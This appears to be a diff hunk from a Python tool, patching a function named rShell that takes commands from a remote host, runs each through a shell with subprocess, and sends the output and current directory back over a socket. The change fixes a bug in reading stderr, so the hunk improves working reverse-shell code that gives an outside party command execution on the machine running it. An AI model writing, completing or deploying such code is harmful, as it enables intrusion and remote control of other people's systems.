@@ -214,7 +214,7 @@ def rShell(rsHost, rsPort):
                     os.chdir(data[3:])
                 if len(data) > 0:
                     sproc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                    stdout_value = sproc.stdout.read() + stderr.read()
+                    stdout_value = sproc.stdout.read() + sproc.stderr.read()
                     output_str = str(stdout_value)
                     currentWD = os.getcwd() + "> "
                     rs.sendto(str.encode(output_str + currentWD), (str(rsHost), int(rsPort)))
